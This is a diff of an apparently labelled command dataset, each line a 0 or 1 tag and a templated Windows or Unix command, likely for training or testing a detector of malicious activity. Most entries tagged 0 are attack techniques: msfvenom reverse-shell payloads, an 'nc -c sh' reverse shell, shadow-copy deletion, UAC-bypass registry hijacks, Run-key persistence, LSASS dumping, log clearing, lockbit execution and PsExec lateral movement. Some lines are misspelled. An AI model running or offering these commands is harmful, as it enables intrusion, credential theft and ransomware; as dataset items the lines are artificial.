@@ -25,36 +25,30 @@
 1	7z a archive.7z ${source_directory}
 1	7z a archive.7z ${source_directory} -p${password}
 1	powershell -c "Copy-Item ${source_file_path} -Destination ${destination_file_path}"
-1	powershell -c "Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse"
-1	Copy-Item ${source_file_path} -Destination ${destination_file_path} -Recurse -Container
-1	cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
-0	cmd.exe /c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
-0	cmd.exe /c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute} -s"
-0	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
-0	telnet ${ip_address} ${port} < ${source_file_path}
-0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
-0	powershell -c "curl ${source_file_path} -o $ ${destination_file_path}"
-0	powershell -c "vssadmin create shadow /for=C:"
-0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
-0	powershell -c "taskkill.exe /f /im ${process_name}"
-0	powershell -c "choco install -y putty"
-0	cat email.txt | sendmail ${username}@${domain}
-0	[System.Environment]::UserName
-0	socat - TCP:${ip_address}:${port} < ${source_file_path}
-0	wmic group get name
-0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ${value_name} /t REG_DWORD /d ${value}
-0	powershell -c "wmic.exe shadowcopy delete"
-0	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	reg SAVE HKLM\SYSTYEM ${local_file_path}
-0	vssadmin.exe delete shadows /all /quiet
-0	msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	cmd.exe /c "curl ${source_file_path} -o $ ${destination_file_path}"
-0	New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "${command_to_execute}"; New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
-0	sc.exe stop ${service_name}
+0	wevtutil cl application
+0	powershell -c "lockbit.exe -pass ${password}"
+0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	choco install -y 7zip
+0	reg add hkcu\software\classes\ms-settings\shell\open\command /ve /d "${command_to_execute}" /f && reg add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v ${value_name} /t REG_DWORD /d ${value}
+0	akagi32 23 ${command_to_execute}
+0	sc create win32times binPath="${command_to_execute}"
+0	plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+0	SharpRDP.exe computername=${ip_address} command="${command_to_execute}" username=${domain}\${username} password=${password}
+0	Copy-Item "${local_file_path}" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+0	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path}
+0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+0	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 0	powershell -c "choco install putty"
-0	powershell -c "xcopy ${source_directory} \\${ip_address}\${destination_directory} /s /e"
+0	PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+0	vssadmin create shadow /for=C:
+0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain}
+0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
+0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
+0	quser ${username}
 0	powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
-0	echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
-0	lockbit.exe -pass ${password}
-0	nanodump.x64.exe -w lsassdump.dmp
+0	nc -c sh ${ip_address} ${port}
+0	pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+0	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
